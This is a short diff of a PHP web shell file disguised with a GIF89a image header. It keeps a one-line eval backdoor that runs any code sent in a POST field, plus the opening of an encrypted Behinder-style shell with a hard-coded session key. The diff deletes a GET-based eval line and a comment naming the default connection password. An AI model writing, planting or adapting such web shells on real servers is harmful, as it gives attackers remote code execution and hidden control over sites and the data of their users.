@@ -1,12 +1,10 @@
 Eval
 GIF89a
 <?php @eval($_POST[rm]);?>
-<?php @eval($_GET[rm]);?>
-
 <?php
 @error_reporting(0);
 session_start();
-    $key="39b9df3a0fb3356d"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
+    $key="39b9df3a0fb3356d"; 
 	$_SESSION['k']=$key;
 	session_write_close();
 	$post=file_get_contents("php://input");
